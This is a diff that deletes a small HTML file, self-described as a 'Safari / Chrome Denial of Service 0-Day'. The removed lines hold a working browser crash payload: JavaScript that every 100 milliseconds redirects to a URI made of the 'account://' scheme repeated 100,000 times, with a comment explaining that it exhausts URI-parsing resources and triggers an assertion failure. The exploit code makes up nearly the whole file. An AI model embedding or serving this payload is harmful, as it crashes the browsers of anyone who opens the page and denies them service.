@@ -1,8 +1,0 @@
-<!--
-	Safari / Chrome Denial of Service 0-Day
-	Written by Sem Voigtländer, ain't no big deal
-	This script exhausts a resource in the parsing of URI schemes causing a denial of service due to an assert() failure.
--->
-<script type="text/javascript">
-    setInterval(function(){window.location.href='account://'.repeat(100000);},100);
-</script>
